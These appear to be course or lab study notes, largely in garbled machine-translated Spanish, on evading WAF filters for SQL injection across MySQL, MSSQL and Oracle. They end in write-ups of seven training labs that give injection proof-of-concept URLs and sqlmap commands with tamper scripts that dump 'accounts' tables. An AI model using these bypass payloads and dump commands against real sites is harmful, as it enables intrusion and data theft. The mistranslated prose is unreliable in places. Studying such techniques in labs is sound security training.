# SQL Injection Filter Evasion

Cómo los WAF intentan proteger sitios web

Pasajas de la WAF

## Intro

SQLi ha evolucionado tanto, ahora no sólo podemos manipular la base de datos y obtener acceso, sino también DoS, difundir malware, phishing, etc.

### DBMS Gadgets

#### Comments

Los comentarios son útiles para devs Para aclarar declaraciones SQL particulares

Nuestros verterposes: Comentando la consulta y ofuscando partes de nuestro código

Sintaxis MySQL:

```bash
https://dev.mysql.com/doc/refman/8.0/en/comments.html

#
* ... */
-- -
;%00
```

MSSQL syntax:

```bash
- http://msdn.microsoft.com/en-us/library/ff848807.aspx
/* ... */
-- -
;%00
```

Oracle syntax:

```bash
- https://docs.oracle.com/cd/B19306_01/server.102/b14200/sql_elements006.htm#i31713

/* ... */
-- -
```

## Functions and Operators

### MySQL

* http://dev.mysql.com/doc/refman/5.7/en/functions.html

Magic numbers:

```bash
SELECT name from exployees WHERE id='MAGIC-HERE'

# By manipulating the plus and minus chars we can generate a countless list of the number 1:

id=1
id=--1
id=-+-+1
id=----2---1
```

Funciones de Bitwise:

```bash
- http://dev.mysql.com/doc/refman/4.1/en/bit-functions.html#operator_bitwise-invert
id=1&1
id=0|1
id=13^12
id=8>>3
id=~-2
```

Operador lógico:

```bash
- http://dev.mysql.com/doc/refman/5.7/en/logical-operators.html
id=NOT 0
id=!0
id=!1+1
id=1&&1
id=1 AND 1
id=!0 AND !1+1
id=1 || NULL
id=1 || !NULL
id=1 XOR 1
```

Reguler Expression Operators (REGEX):

```bash
- http://dev.mysql.com/doc/refman/5.7/en/regexp.html
id={anything} REGEXP '.*'
id={anything} NOT REGEXP '{randomkeys}'
id={anything} RLIKE '.*'
id={anything} NOT RLIKE '{randomkeys}'
```

Comparison Operators:

```bash
- http://dev.mysql.com/doc/refman/5.7/en/comparison-operators.html

id=GREATEST(0,1)
id=COALESCE(NULL,1)
id=ISNULL(1/0)
id=LEAST(2,1)
```

In MSSQL we cannot use two equal signs concatenated:

```bash
id=1
id=-+-+1
id=-+-+-+-+-+-+1
id=-+-+-+-+-+-+-+-+-+1*-+-+-+-+-+-+-+-+-+1
```

BitWise Operators:

```bash
- http://msdn.microsoft.com/en-us/library/ms176122.aspx

We can only manipulate using:
&=(AND)
|=(OR) 
^ = (XOR)
```

En MySQL hay otro operador que podemos aprovechar Para probar si algunas condiciones son ciertas o no

→ http://dev.mysql.com/doc/refman/5.7/en/subqueries.html

In SQL Server, these are all grouped in one table:

```bash
- http://msdn.microsoft.com/en-us/library/ms189773.aspx
However there are not short forms, so 
&&
||
etc... Are not valid in this DBMS
```

### Oracle

```bash
SELECT name from exployees WHERE id='MAGIC-HERE'
```

ORacle es más restrictivo

Para utilizar los operadores aritméticos, debemos crear una expresión válida para evitar la **missing expression erro**:

```bash
id=1
id=-(-1)
id=-(1)*-(1)
```

Para combinar valores, funciones y operadores en expresiones, debemos seguir la lista de Condiciones mezcladas a la Expresión

→ https://docs.oracle.com/cd/B28359\_01/server.111/b28286/conditions.htm#SQLRF005

→ https://docs.oracle.com/cd/B28359\_01/server.111/b28286/expressions.htm#SQLRF004

```bash
SELECT name from employees where id=some(1)
```

## Intermediary Characters

* Los espacios en blanco son útiles para separar funciones, operadores, declaraciones, etcéteros, básicamente personajes intermediarios.
* Sin embargo, hay caracteres no comunes que pueden ser usuarios

### MySQL

```bash
SELECT[CHAR]name[CHAR]from[CHAR]employees
```

Universal characters allowed as whitespaces:

\| Codepoint | Character || | 9 | U+0009 | = character tabulation| | 10 | U+000A | = Life feed (LF)| | 11 | U+000B | = Line Tabulation| | 12 | U+000C | = Form feed| | 13 | U+000D | = Carriage return (CR)| | 32 | U+0020 | = Space|

### MSSQL

La lista de caracteres Universal permitidos como espacio blanco son grandes. Esencialmente, todos los caracteres de control ASCII, el espacio y el espacio sin romper están permitidos.

\| Codepoint | Character || | 160 | U+00A0 | = No-break space |

### Oracle

Hay 7 personajes en total

All the mysql table + the NULL char:

\| Codepoint | Character || | 0 | U+0000 | // NULL|

## Non Universal characters

### Mysql / MSSQL / Oracle

Plus Sign (+)

En todo el DBMS podemos utilizar el (o) para separar casi todas las palabras clave excepto **FROM**:

```bash
SELECT+name FROM exployees WHERE+id=1 AND+name LIKE+'J%'
```

En todo DMBS dependiendo del contexto, también podemos utilizar

```bash
Parenthesis ()
Operators
Quotes 
and of course the C-Style comments /**/
```

## Constants and Variables

* Constants (AKA Palabras reservadas)
* Conociendo las palabras clave de SQL es una necesidad
* Las variables del sistema también pueden ser muy útiles

### MySQL

La única manera de ofuscar las palabras clave es manipulando upper/lower case variaciones como:

```bash
sELeCt
SELect
etc
```

Variables del sistema

→ http://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html

Podemos usar la declaración:

```bash
SHOW VARIABLES
```

La lista es grande, si quiere recuperar un valor específico, sólo tienes que añadir antes del nombre de la variable:

```bash
@@version
```

Variables de usuario:

```bash
SET @myvar={expression}
SET @myvar:={expression}
```

### MSSQL

Palabras clave

→ http://msdn.microsoft.com/en-us/library/ms189822.aspx

Esta lista no sólo muestra palabras reservadas SQL, sino también funciones del sistema

* Información sobre la configuración y más se organiza como funciones de incorporado

→ http://technet.microsoft.com/en-us/library/ms174318(v=sql.110).aspx

Hay principalmente cuatro tipos de funciones, más cerca de la variable **Scalar Functions**:

```bash
@@version // its a Scalar function
```

### Oracle

Gestión particular de las palabras

→ https://docs.oracle.com/cd/B10501\_01/appdev.920/a42525/apb.htm

TAquí están ambas Palabras reservadas, las palabras que no se pueden redefinir, y Palabras clave, palabras siempre importantes pero pueden ser redefinidas por el usuario

Ejemplo: podemos crear un table **DATABASE** porque la palabra clave no está reservada:

```bash
CREATE TABLE DATABASE (id number);
```

## Strings

Veamos técnicas que son útiles en la creación, manipulación y ofuscación de cuerdas

### Regular Notations

#### MYSQL

Para definir una cadena podemos utilizar:

```bash
single quote  ('')
double quotes ("")
```

Para definir los literales de cuerda:

```bash
_latin1'string'
```

El conjunto de caracteres que se puede utilizar tiene aproximadamente 40 valores posibles y puede utilizar cualquiera de ellos precedido por un carácter subrayado:

```bash
SELECT _ascii'Break Me'
```

U puede usar N'literal' o n'niteral' para crear una cuerda en el Conjunto Nacional de personajes: http://dev.mysql.com/doc/refman/5.7/en/charset-national.html

```bash
SELECT N'mystring'
```

Hexadecimal

→ https://dev.mysql.com/doc/refman/8.0/en/hexadecimal-literals.html

```bash
SELECT X'4F485045'
SELECT 0x4F485045
```

Bit Literals

→ https://dev.mysql.com/doc/refman/5.7/en/bit-value-literals.html

Usando como B'literal' o b'literal':

```bash
SELECT 'a'=B'1100001' #TRUE
```

#### MSSQL

Define lo literal como un valor constante o escalar.

* sólo puede definirse mediante el uso de cotizaciones individuales (\*\*" '\*\*\*\*)

Si es Tú QUOTED\_IDENTIFIER opciones está activada, entonces podemos utilizar comillas dobles (**" "**)

```bash
SELECT 'Hello'
```

#### OrACLE

Tampoco permite comillas dobles. Pero podemos usar la notación nacional → https://docs.oracle.com/cd/B28359\_01/server.111/b28286/sql\_elements003.htm#SQLRF00218

```bash
SELECT 'Hello'
SELECT N'Hello'
SELECT q'[Hello]'
SELECT Q'{Hello}'
SELECT nQ'("admin")'
```

### Unicode

MYSQL:

```bash
- http://dev.mysql.com/doc/refman/5.5/en/charset-collation-effect.html

Documented above:
SELECT 'admin'='âđɱȋň' #TRUE
```

### Escaping

Usando el contrasuelo antes de comillas individuales y dobles

→ https://dev.mysql.com/doc/refman/8.0/en/string-literals.html

Sin embargo, también hay otros caracteres especiales utilizados para escapse:

```bash
SELECT 'He\'llo'
SELECT 'He\%\_llo'
```

Además, para escapar de las citas podemos usar el mismo carácter dos veces:

```bash
SELECT 'He''llo'
SELECT "He""llo"
```

Si tratamos de escapar de un personaje que no tiene una secuencia de escape respectiva, la reacción será ignorada:

```bash
SELECT '\H\e\l\l\o'
SELECT 'He\ll\o'
```

En MSSQL y Oracle, u puede escapar de comillas individuales usando dos comillas individuales:

```bash
SELECT 'He''llo'
```

### Concatenation

Para las cuerdas citadas, la concatenación se puede realizar colocando la cuerda una al lado de la otra:

```bash
SELECT 'he' 'll' 'o'
```

Como alternativa, podemos utilizar funciones like CONCAT and CONCAT\_WS

→ http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function\_concat

→ http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function\_concat-ws

WS stand For **with separator**:

```bash
SELECT CONCAT('He','ll','o')
SELECT CONCAT_WS(''. 'He', 'll', 'o')
```

Es posible concatenar usando la mezcla de comentarios in C-Style:

```bash
SELECT 'He'/**/'ll'/**/'o'
SELECT /**/'He'/**/'ll'/**/'o'/**/
SELECT /*!10000 'He' */'ll'/*****/'o'/*****/
```

in MSSQL: Se puede hacer utilizando tanto el operador como la función CONCAT → http://msdn.microsoft.com/en-us/library/hh231515.aspx

```bash
SELECT 'He'+'ll'+'o'
SELECT CONCAT('He','ll','o')
```

Podemos ofuscar usando C-Style Observaciones:

```bash
SELECT 'He'/**/+/**/'ll'/**/+'o'
SELECT CONCAT(/**/'He',/**/1/**/,/**/'lo'/**/)
```

In Oracle: El operador es \*\*\*\* y, desde la perspectiva de la función, podemos usar **CONCAT** y **NVL**:

→ https://docs.oracle.com/cd/B28359\_01/server.111/b28286/functions026.htm#SQLRF00619

→ https://docs.oracle.com/cd/B28359\_01/server.111/b28286/functions110.htm#SQLRF00684

```bash
SELECT 'He'||'ll'||'o'
SELECT CONCAT('He','llo')
SELECT NVL('Hello', 'Goodbye')
```

Obuscar la concatenación de cuerda:

```bash
SELECT q'[]'||'He'||'ll'/**/'o'
SELECT CONCAT(/**/'He'/**/,/**/'ll'/**/)
```

Integers:

* Ejemplo es utilizar el valor PI (3.11593...). Con FLOOR para obtener el valor 3, y CEIL para obtener el valor 4
* Podemos usar la función del sistema como versión() y obtener el valor 5,6

Por ejemplo

```bash
ceil(pi()*3) = 10
```

### MySQL Type Conversion

Combinando operaciones aritméticas con diferentes tipos:

```bash
SELECT ~'-2it\'s a kind of magic'
```

Números vs Booleans:

```bash
SELECT ... 1=TRUE
SELECT ... 2! =TRUE
SELECT ... OR 1
SELECT ... AND 1
```

Strings vs Numbers vs Booleans:

```bash
SELECT ... VERSION()=5.5 #5.5.30
SELECT ... @@VERSION()=5.5 #5.5.30
SELECT ... ('type'+'cast')=0 #TRUE
SELECT ~'-2it\'s a kind of mafic'        '#1
SELECT ~'-1337a kind of magic'-25 #1337
```

Bypassing Authentication:

```bash
# Put all of this together and try to think of some alternatives to the classic

x' OR 1='1
```

## Bypassing Keyword Filters

La primera limitación son la restricción de palabras clave

### Case Changing

Lo más simple es cambiar los casos de cada personaje:

```bash
SeLeCt
SEleCT
etc
```

sqlmap tiene un guión de manipulación para automatizar este cambio de caso

→ https://github.com/sqlmapproject/sqlmap/blob/master/tamper/randomcase.py

### Using Intermediary Characters

Podemos utilizar ambos comentarios en lugar de espacios y dependiendo de la versión DBMS, una lista del espacio en blanco que no se ajuste como espacios:

```bash
SELECT/**/values/**/and/**/.../**/or/**/
SELECT[sp]values[sp]and...[sp]or[sp]
```

### Using alternative Techniques

```bash
SELECT"values"from'table'where/**/1
SELECT(values)from(table)where(1)
SELECT"values"''from'table'where(1)
SELECT+"values"%A0from'table'
```

### Circumventing by Encoding

Todo depende de cómo la aplicación procese los datos

* entre el atacante y la aplicación, hay muchas capas, como un proxy, cortafuegas, etc. Si algunas de estas capas manejan la codificación de manera diferente, podría haber un posible bypass

URL Codificación:

```bash
- Usually when the requests are sent through the internet via HTTP, they are URL encoded.
- In this case we can send the entire string URL-encoded
```

Codificación de doble URL:

```bash
# If u encode a URL-Encoded string, they u are performing a Double URL-Encoding

s = %73 > %2573
```

> En este caso, si el filtro decodifica la solicitud la primera vez y aplica las reglas, no encontrará nada peligroso

> Luego, cuando la solicitud reciba la solicitud, decodificará el contenido y desencadenará la solicitud maliciosa

### Replaced Keywords

```bash
Booleans > AND, OR
- AND = &&
- OR  = ||
# only in MySQL and MSSQL
WHERE ID=x && 1=1
WHERE ID=x || 1=1

# If && and || are filtered, then u must use 'UNION'
```

```bash
UNION > Simple case
# We can use many variants to elude these kind of filters:

UNION(SELECT 'VALUES'...) &&
UNION ALL SELECT ...
UNION DISTINCT SELECT ...
/*!00000 UNION*//*!00000 SELECT*/ ...
```

WHen the **UNION** is filtered, Debemos cambiar a blind SQLi exploitation:

```bash
(SELECT id FROM users LIMIT 1)='5 ...
```

In Oracle:

→ https://docs.oracle.com/cd/B28359\_01/server.111/b28286/queries004.htm#SQLRF52323

* We can use **INTERSECT** or **MINUS** operators

WHERE, GROUP, LIMIT, HAVING:

* Palabras clave útiles para seleccionar una entrada específica

If the filter blocks **WHERE** keyword, podemos alternativamente nosotros usar **GROUP BY** + **HAVING**:

```bash
SELECT id FROM users GROUP BY id HAVING id='5 ...
```

If **GROUP BY** es filtrado, debemos volver a la persiana SQLi:

```bash
AND length((select first char)='a') //0/1 > true/false
```

Si **HAVING** está filtrado, en este caso debemos aprovechar funciones como **GROUP\_CONCAT**, funciones que manipulan las cuerdas, etc. Por supuesto, todo esto es ciego.

If **SELECT** se filtra, La explotación puede variar y realmente depende de la punto de inyecciónt.

Necesitas usar funciones que manipulan FILES como:

```bash
load_files //in mysql
```

Otra opción, fuerza bruta o adivinar los nombres de la columna mediante la adjuntación de otros **WHERE** condiciones como:

```bash
AND COLUMN IS NOT NULL ...
```

Alternativamente, poder invocar el **stored procedure analyse()**

→ http://dev.mysql.com/doc/refman/5.7/en/procedure-analyse.html

Esto **sproc** devuelve la información jugosa sobre la consulta que acaba de ejecutar:

```bash
SELECT * FROM employees procedure analyse()
```

## Bypassing Function Filters

Deshagamos ahora técnicas útiles y funciones alternativas Para usar en este tipo de escenarioss

### Building Strings

En el capítulo DBMS Gadget, discutimos cómo generar cadenas pero, usamos citas. Construir cuerdas sin comillas es un poco complicado:

```bash
- UNHEX
- HEX
- CHAR
- ASCII
- ORD
```

UNHEX es útil para traducir números hexadecimales en cuerda:

```bash
- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_unhex

SUBSTR(USERNAME,1,1)=UNHEX(48)
SUBSTR(USERNAME,1,2)=UNHEX(4845)
...
SUBSTR(USERNAME,1,5)=UNHEX('48454C4C4F')
SUBSTR(USERNAME,1,2)=0x48454C4C4F
```

La función HEX es útil para convertir o hexadecimal:

```bash
- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_hex

HEX(SUBSTR(USERNAME,1,1))=48
HEX(SUBSTR(USERNAME,1,2))=4845
...
HEX(SUBSTR(USERNAME,1,5))='48454C4C4F'
```

CHAR También se puede utilizar:

```bash
- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_char

SUBSTR(USERNAME,1,1)=CHAR(72)
SUBSTR(USERNAME,1,2)=CHAR(72,69)
...
SUBSTR(USERNAME,1,1)=CONCAT(CHAR(72),CHAR(69))
```

ASCII and ORD: funciones gemelas:

```bash
- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_ascii
- http://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_ord

ASCII(SUBSTR(USERNAME,1,1))=48
ORD(SUBSTR(USERNAME,1,1))=48
```

CONV: mySQL ofrece un método interesante para devolver la representación en cadena de un número de dos bases

* http://dev.mysql.com/doc/refman/5.7/en/mathematical-functions.html#function\_conv

> La base más alta que podemos utilizar es 36

No podemos usar Personajes de **unicode**; sin embargo, al menos podemos generar una cadena de a-zA-Z0-9:

```bash
CONV(10,10,36) //'a'
CONV(11,10,36) //'b'
```

Podemos mezclar los resultados con las funciones **upper** y \*\* inferior\*\* para recuperar la representación respectiva:

```bash
LOWER(CONV(10,10,36)) #'a'
LCASE(CONV(10,10,36)) #'a'
UPPER(CONV(10,10,36)) #'A'
UCASE(CONV(10,10,36)) #'A'
...
```

### Brute-force Strings

```bash
- LOCATE
- INSTR
- POSITION
```

Si u no puede construir una cadena, u puede tratar de localizar un segmento o una cadena entera usando funciones que devuelen la posición de la primera ocurrencia de subcadenaciones, y luego utilizar declaraciones condicionales Para la condición booleana.

```bash
IF(LOCATE('H',SUBSTR(USERNAME,1,1)),1,0)
# u can also use functions 'INSTR' and 'POSITION'
```

### Building Substring

```bash
- SUBSTR
- MID
- SUBSTRING
```

MID is a synonym of SUBSTRING, which is a synonym of SUBSTR:

```bash
[SUBSTR|MID|SUBSTRING]('HELLO' FROM 1 FOR 1)
```

Alternativamente, functions **LEFT** and **RIGHT**

→ http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function\_left

→ http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function\_right

```bash
[LEFT|RIGHT]('HELLO',2) //HE or LO
```

Más opciones functions like **RPAD** and **LPAD**:

```bash
[LPAD,RPAD]('HELLO',6,'?') //?HELLO or HELLO?
[LPAD,RPAD]('HELLO',1,'?') //H
...
[LPAD,RPAD]('HELLO',5,'?') //HELLO 
```

## Labs

Nota: Diferentes versiones sqlmap pueden requerir diferentes opciones/flajas. Por ejemplo, el laboratorio 4 puede resolverse utilizando lo siguiente:

```bash
sqlmap -u 'http://192.222.62.2/upload.php?lab=4&payload=' -p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 --banner --flush-session --regexp='99\sviews'  --prefix="01.jpg'"
```

### 1 - ENTRY LEVEL

```bash
# Query:
$query = "SELECT views from attachments where filename='$filename'";


# PoC
http://hacker.site/2nd/view.php?payload=%27%20union%20select%20@@version;%20--%20-

# SQLMAP
./sqlmap.py -u 'http://hacker.site/2nd/view.php?payload=a' --technique=U --suffix='; -- -' --banner
	
./sqlmap.py -u 'http://hacker.site/2nd/view.php?payload=a' --technique=U --suffix='; -- -' -D selfie4you01 -T accounts --dump --no-cast
```

### 2 - UNION SELECT

* sin filtros.

```bash
Filters: none

Query:
$query = "SELECT views FROM attachments where filename='$entry';";


# PoC
http://hacker.site/2nd/upload.php?lab=2&payload='+union+select+@@version;%23

# SQLMAP
./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=2&payload=_" -p payload --technique=U --suffix=';#' --union-col=1 --dbms MySQL --banner --no-cast

./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=2&payload=_" -p payload --technique=U --suffix=';#' --union-col=1 --dbms MySQL -D selfie4you02 -T accounts --dump --no-cast

```

### 3 - UNION SELECT

* filtro de azar
* sindicato-char no es necesario aquí.

```bash
Filters:
/UNION/
/SELECT/

Query:
$query = "SELECT views FROM attachments where filename='$entry';";


# PoC
http://hacker.site/2nd/upload.php?lab=3&payload=a%27%20UNIoN%20SeLECT%20%27PoC%20String%27;%20--%20-

# SQLMAP

./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=3&payload=b' \
	-p payload --technique=U --suffix=';#' --dbms MySQL --union-col=1 --no-cast \
	--tamper=randomcase --banner

./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=3&payload=b' \
	-p payload --technique=U --suffix=';#' --dbms MySQL --union-col=1 --no-cast \
	--tamper=randomcase -D selfie4you03 -T accounts --dump
```

### 4 - Boolean-based blind

* UNION filtrada
* filtro simbólico (AND && , OR)

```bash
Filters:
/UNION/i
/\ AND\ /i

Query:
$query = "SELECT views FROM attachments where filename='$entry';";


# POCs

# (%26) == &
TRUE:	http://hacker.site/2nd/upload.php?lab=4&payload=01.jpg'+%26%26+'123'='123
FALSE:	http://hacker.site/2nd/upload.php?lab=4&payload=01.jpg'+%26%26+'123'='1

# using true (1) and false (0)booleans
# (%23) == #
TRUE:	http://hacker.site/2nd/upload.php?lab=4&payload=01.jpg'+%26%26+TRUE;%23
FALSE:	http://hacker.site/2nd/upload.php?lab=4&payload=01.jpg'+%26%26+FALSE;%23


# SQLMAP
./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=4&payload=X' \
	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
	--banner --flush-session

./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=4&payload=X' \
	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
	-D selfie4you04 -T accounts --dump

```

### 5 - Boolean-based blind

* UNION filtrada
* Filtro simbólico (AND && , OR .)

```bash
Filters:
/UNION/i
/\ AND\ /i
/\ OR\ /i

Query;
$query = "SELECT views FROM attachments where filename='$entry';";


POCs:
# same as #4 but with filter that applies to OR too 
# (%7C) == |

# SQLMAP
./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=5&payload=X' \
	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
	--banner --flush-session

./sqlmap.py -u 'http://hacker.site/2nd/upload.php?lab=5&payload=X' \
	-p payload --technique=B --dbms MySQL --no-cast --tamper=symboliclogical --threads=10 \
	-D selfie4you05 -T accounts --dump 

```

### 6 - Boolean-based blind

* UNION filtrada
* Filtro simbólico (AND && , OR .)
* espacio para el filtro de pestañas verical para eludir el filtro \[espacio]OR

```bash
Filters:
/UNION/i
/AND/i
/ OR/i

Query;
$query = "SELECT views FROM attachments where filename='$entry';";

# SQLMAP

./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=6&payload=x" \
	-p payload --technique=B --dbms MySQL --suffix=';#' --tamper="symboliclogical, space2VT.py" \
	--no-cast --threads=10 -v 3 \
	--banner --flush-session 
	
./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=6&payload=x" \
	-p payload --technique=B --dbms MySQL --suffix=';#' \
	--tamper="symboliclogical, space2VT.py" \
	--no-cast --threads=5 -v 3 \
	-D selfie4you06 -T accounts \	
	--columns 
```

### 7 - Boolean-based blind

* UNION filtrada
* Filtro simbólico (AND && , OR .)
* espacio para el filtro de pestañas verical para eludir el filtro \[espacio]OR

```bash
Filters:
/UNION/i
/AND/i
/ OR/i
/6163636f756e7473/
/selfie4you07.accounts/

Query;
$query = "SELECT views FROM attachments where filename='$entry';";


# PoC
TRUE:	http://hacker.site/2nd/upload.php?lab=7&payload=01.jpg'+%26%26+TRUE;%23


# SQLMAP

./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=7&payload=x" \
	-p payload --technique=B --dbms MySQL --suffix=';#' \
	--tamper="symboliclogical, space2VT.py, accounts.py" \
	--no-cast --threads=5 -v 3 \
	--banner --flush-session 
	
	
./sqlmap.py -u "http://hacker.site/2nd/upload.php?lab=7&payload=x" \
	-p payload --technique=B --dbms MySQL --suffix=';#' \
	--tamper="symboliclogical, space2VT.py, accounts.py" \
	--no-cast --threads=5 -v 3 \
	-D selfie4you07 -T accounts \
	--columns
	
```

### BONUS LEVEL(s)

EN TODOS LOS NIVELES LA FILTER NO RECOURSIVE

* Para explotarlo debes subir primero un nombre de archivo con la carga útil que desea ejecutar.
* Esto será excluido porque contiene palabras filtradas
* A continuación, subir un nuevo archivo con un nombre que eluden el filtro redundante, como _unUNIONnion_.
* Una vez **purificada** el último nombre de archivo será el mismo que el puño subido y por lo tanto las salidas de archivo y se puede mostrar.
